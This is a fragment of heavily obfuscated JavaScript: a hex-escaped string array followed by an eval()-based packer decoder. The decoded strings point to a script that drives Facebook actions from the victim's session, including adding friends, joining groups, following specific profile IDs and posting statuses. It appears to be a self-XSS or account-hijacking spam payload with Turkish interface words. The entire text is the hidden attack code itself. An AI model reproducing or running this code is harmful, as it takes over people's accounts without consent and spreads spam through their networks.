x7C\x66\x61\x63\x65\x62\x6F\x6F\x6B\x7C\x63\x6F\x6D\x7C\x7C\x63\x6C\x6F\x73\x65\x7C\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72\x7C\x73\x61\x72\x6B\x61\x64\x61\x73\x65\x6B\x6C\x65\x7C\x67\x72\x6F\x75\x70\x73\x7C\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x7C\x72\x65\x66\x7C\x67\x72\x6F\x75\x70\x5F\x69\x64\x7C\x67\x69\x64\x7C\x6B\x65\x65\x70\x7C\x61\x6C\x69\x76\x65\x7C\x66\x72\x69\x65\x6E\x64\x5F\x62\x72\x6F\x77\x73\x65\x72\x7C\x66\x61\x6C\x73\x65\x7C\x73\x75\x62\x73\x63\x72\x69\x62\x65\x7C\x69\x6E\x64\x65\x78\x7C\x6D\x65\x6D\x62\x65\x72\x73\x7C\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x7C\x44\x61\x74\x65\x7C\x68\x61\x79\x69\x72\x7C\x74\x69\x6B\x6C\x61\x6D\x61\x7C\x74\x65\x78\x74\x7C\x5F\x5F\x68\x74\x6D\x6C\x7C\x72\x61\x6E\x64\x6F\x6D\x56\x61\x6C\x75\x65\x7C\x76\x37\x7C\x75\x6E\x65\x73\x63\x61\x70\x65\x7C\x62\x75\x74\x74\x6F\x6E\x7C\x55\x52\x4C\x7C\x73\x75\x62\x73\x63\x72\x69\x62\x65\x64\x5F\x62\x75\x74\x74\x6F\x6E\x5F\x69\x64\x7C\x33\x36\x35\x7C\x75\x33\x37\x71\x61\x63\x5F\x33\x37\x7C\x66\x6F\x6C\x6C\x6F\x77\x5F\x70\x72\x6F\x66\x69\x6C\x65\x7C\x6B\x61\x64\x69\x6E\x7C\x6C\x73\x64\x7C\x73\x63\x72\x69\x70\x74\x7C\x65\x72\x6B\x65\x6B\x7C\x69\x64\x7C\x74\x69\x6D\x65\x6C\x69\x6E\x65\x7C\x65\x64\x69\x74\x5F\x70\x72\x6F\x66\x69\x6C\x65\x7C\x62\x61\x73\x69\x63\x5F\x69\x6E\x66\x6F\x7C\x72\x6F\x75\x6E\x64\x7C\x68\x74\x74\x70\x7C\x69\x6E\x7C\x5F\x5F\x7C\x41\x73\x79\x6E\x63\x52\x65\x71\x75\x65\x73\x74\x7C\x63\x6C\x61\x73\x73\x7C\x75\x69\x42\x75\x74\x74\x6F\x6E\x54\x65\x78\x74\x7C\x63\x65\x72\x65\x7A\x69\x41\x6C\x7C\x46\x72\x69\x65\x6E\x64\x7C\x68\x6F\x77\x5F\x66\x6F\x75\x6E\x64\x7C\x73\x65\x74\x55\x52\x49\x7C\x72\x65\x66\x5F\x70\x61\x72\x61\x6D\x7C\x6E\x6F\x6E\x65\x7C\x6F\x75\x74\x67\x6F\x69\x6E\x67\x5F\x69\x64\x7C\x6C\x6F\x67\x67\x69\x6E\x67\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x7C\x41\x75\x74\x6F\x7C\x62\x79\x7C\x41\x6E\x6F\x6E\x79\x6D\x6F\x75\x73\x7C\x63\x6C\x61\x73\x73\x4E\x61\x6D\x65\x7C\x75\x69\x42\x75\x74\x74\x6F\x6E\x7C\x6F\x6E\x63\x6C\x69\x63\x6B\x7C\x63\x68\x69\x6C\x64\x45\x6C\x65\x6D\x65\x6E\x74\x43\x6F\x75\x6E\x74\x7C\x62\x72\x7C\x6E\x6F\x5F\x66\x6C\x79\x6F\x75\x74\x5F\x6F\x6E\x5F\x63\x6C\x69\x63\x6B\x7C\x65\x67\x6F\x5F\x6C\x6F\x67\x5F\x64\x61\x74\x61\x7C\x31\x30\x30\x30\x30\x31\x39\x35\x33\x31\x33\x39\x32\x36\x35\x7C\x34\x36\x37\x32\x36\x38\x32\x31\x30\x30\x31\x34\x39\x34\x36\x7C\x31\x37\x30\x31\x31\x38\x36\x31\x33\x31\x34\x33\x31\x31\x37\x7C\x34\x35\x31\x31\x34\x32\x39\x31\x38\x32\x39\x34\x31\x34\x32\x7C\x31\x32\x39\x38\x30\x37\x30\x32\x33\x38\x39\x30\x32\x30\x31\x7C\x34\x37\x32\x36\x36\x34\x32\x30\x36\x31\x34\x32\x30\x31\x33\x7C\x68\x74\x74\x70\x5F\x72\x65\x66\x65\x72\x65\x72\x7C\x73\x75\x62\x73\x74\x72\x69\x6E\x67\x7C\x6C\x69\x73\x74\x73\x7C\x6D\x65\x6D\x62\x65\x72\x73\x68\x69\x70\x7C\x72\x32\x6A\x7C\x31\x36\x35\x38\x31\x36\x37\x34\x39\x31\x31\x34\x38\x34\x38\x33\x36\x39\x31\x31\x35\x7C\x66\x6C\x6F\x6F\x72\x7C\x67\x72\x6F\x75\x70\x5F\x6A\x75\x6D\x70\x5F\x68\x65\x61\x64\x65\x72\x7C\x6D\x6F\x64\x69\x66\x79\x7C\x70\x65\x72\x6D\x61\x6C\x69\x6E\x6B\x7C\x73\x64\x75\x72\x75\x6D\x70\x61\x79\x6C\x61\x73\x7C\x54\x79\x70\x65\x7C\x41\x72\x72\x61\x79\x7C\x66\x61\x72\x6B\x65\x74\x6D\x65\x7A\x7C\x44\x4F\x4D\x4E\x6F\x64\x65\x49\x6E\x73\x65\x72\x74\x65\x64\x7C\x73\x65\x74\x44\x61\x74\x61\x7C\x73\x75\x62\x73\x74\x72\x7C\x65\x72\x72\x6F\x72\x7C\x73\x6F\x72\x74\x7C\x63\x69\x6E\x73\x69\x79\x65\x74\x67\x65\x74\x69\x72\x7C\x73\x63\x69\x6E\x73\x69\x79\x65\x74\x67\x65\x74\x69\x72\x7C\x61\x64\x64\x5F\x70\x6F\x73\x74\x7C\x6D\x65\x73\x73\x61\x67\x65\x5F\x69\x64\x7C\x73\x70\x61\x67\x65\x5F\x69\x64\x7C\x66\x6C\x69\x64\x7C\x73\x70\x6F\x73\x74\x5F\x69\x64\x7C\x73\x66\x6F\x74\x6F\x5F\x69\x64\x7C\x62\x6F\x64\x79\x7C\x70\x72\x6F\x66\x69\x6C\x65\x5F\x69\x64\x7C\x6E\x6D\x7C\x6A\x73\x6D\x6F\x64\x73\x7C\x6D\x61\x72\x6B\x75\x70\x7C\x68\x65\x61\x64\x7C\x65\x76\x65\x74\x7C\x72\x65\x6D\x6F\x76\x65\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72\x7C\x68\x74\x6D\x6C\x7C\x74\x6F\x5F\x66\x72\x69\x65\x6E\x64","","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x72\x65\x70\x6C\x61\x63\x65","\x5C\x77\x2B","\x5C\x62","\x67"];eval(function (_0xaa4ax1,_0xaa4ax2,_0xaa4ax3,_0xaa4ax4,_0xaa4ax5,_0xaa4ax6){_0xaa4ax5=function (_0xaa4ax3){return (_0xaa4ax3<_0xaa4ax2?_0xbf0f[4]:_0xaa4ax5(parseInt(_0xaa4ax3/_0xaa4ax2)))+((_0xaa4ax3=_0xaa4ax3%_0xaa4ax2)>35?String[_0xbf0f[5]](_0xaa4ax3+29):_0xaa4ax3.toString(36));} ;if(!_0xbf0f[4][_0xbf0f[6]](/^/,String)){while(_0xaa4ax3--){_0xaa4ax6[_0xaa4ax5(_0xaa4ax3)]=_0xaa4ax4[_0xaa4ax3]||_0xaa4ax5(_0xaa4ax3);} ;_0xaa4ax4=[function (_0xaa4ax5){return _0xaa4ax6[_0xaa4ax5];} ];_0xaa4ax5=function (){return _0xbf0f[7];} ;_0xaa4ax3=1;} ;while(_0xaa4ax3--){if(_0xaa4ax4[_0xaa4ax3]){_0xaa4ax1=_0xaa4ax1[_0xbf0f[6]]( new RegExp(_0xbf0f[8]+_0xaa4ax5(_0xaa4ax3)+_0xbf0f[8],_0xbf0f[9]),_0xaa4ax4[_0xaa4ax3]);} ;} ;return _0xaa4ax1;} (_0xbf0f[0],62,235,_0xbf0f[3][_0xbf0f[2]](_0xbf0f[1]),0,{}));